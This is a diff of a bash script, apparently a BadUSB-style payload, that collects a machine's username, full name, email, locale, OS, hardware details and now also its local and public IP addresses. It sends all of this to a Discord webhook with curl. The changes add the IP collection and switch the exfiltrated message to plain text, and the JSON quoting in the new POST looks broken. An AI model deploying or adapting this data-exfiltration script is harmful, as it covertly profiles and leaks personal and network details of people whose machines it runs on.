@@ -2,7 +2,6 @@
 
 # Discord webhook URL
 hookurl="$dc"
-
 # Send a notification to Discord on start
 hostname=$(hostname)
 jsonsys=$(jq -n --arg username "$hostname" --arg content ":computer: \`\`Gathering System Information for $hostname\`\` :computer:" '{username: $username, content: $content}')
@@ -37,37 +36,32 @@ total_ram=$(free -h | grep Mem | awk '{print $2}')
 # Get disk space usage
 disk_usage=$(df -h / | grep / | awk '{print $4}')
 
-# Prepare JSON payload with all the gathered information
-jsonpayload=$(jq -n \
-    --arg username "$username" \
-    --arg full_name "$full_name" \
-    --arg email "$email" \
-    --arg system_locale "$system_locale" \
-    --arg keyboard_layout "$keyboard_layout" \
-    --arg os_name "$os_name" \
-    --arg os_version "$os_version" \
-    --arg os_arch "$os_arch" \
-    --arg screen_resolution "$screen_resolution" \
-    --arg cpu_info "$cpu_info" \
-    --arg total_ram "$total_ram" \
-    --arg disk_usage "$disk_usage" \
-    '{
-        "username": $username,
-        "full_name": $full_name,
-        "email": $email,
-        "system_locale": $system_locale,
-        "keyboard_layout": $keyboard_layout,
-        "os_name": $os_name,
-        "os_version": $os_version,
-        "os_arch": $os_arch,
-        "screen_resolution": $screen_resolution,
-        "cpu_info": $cpu_info,
-        "total_ram": $total_ram,
-        "disk_usage": $disk_usage
-    }')
+# Get local IP address
+local_ip=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d '/' -f1 | head -n 1)
 
-# Send the full system information to Discord
-curl -H "Content-Type: application/json" -X POST -d "$jsonpayload" "$hookurl"
+
+# Get public IP address (using ipify API)
+public_ip=$(curl -s https://api.ipify.org)
+
+# Prepare the system information as plain text
+system_info_text="**System Information**\n\n"
+system_info_text+="**Username:** $username\n"
+system_info_text+="**Full Name:** $full_name\n"
+system_info_text+="**Email:** $email\n"
+system_info_text+="**System Locale:** $system_locale\n"
+system_info_text+="**Keyboard Layout:** $keyboard_layout\n"
+system_info_text+="**OS Name:** $os_name\n"
+system_info_text+="**OS Version:** $os_version\n"
+system_info_text+="**OS Architecture:** $os_arch\n"
+system_info_text+="**Screen Resolution:** $screen_resolution\n"
+system_info_text+="**CPU Info:** $cpu_info\n"
+system_info_text+="**Total RAM:** $total_ram\n"
+system_info_text+="**Disk Usage:** $disk_usage\n"
+system_info_text+="**Local IP Address:** $local_ip\n"
+system_info_text+="**Public IP Address:** $public_ip\n"
+
+# Send the system information as a plain text message to Discord
+curl -H "Content-Type: application/json" -X POST -d '{"username": "System Info", "content": "'"$system_info_text"'"}' "$hookurl"
 
 # Output information for debugging
 echo "System information sent to Discord successfully."
